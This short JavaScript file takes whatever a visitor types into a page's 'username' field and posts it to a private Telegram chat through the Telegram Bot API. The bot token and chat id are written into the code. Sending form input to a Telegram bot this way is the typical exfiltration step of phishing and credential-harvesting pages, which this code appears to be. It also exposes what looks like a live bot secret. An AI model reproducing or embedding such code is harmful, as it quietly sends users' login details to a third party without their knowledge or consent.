//bot token
var telegram_bot_id = "5770116864:AAE-ILBXySEol95mUtuNh0eU5xHI3hhINPk";
//chat id
var chat_id = -5714159445;
var message;
var ready = function () {
    message = document.getElementById("username").value;
    message =   message;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
    });
    document.getElementById("message").value = "";
    return false;
};
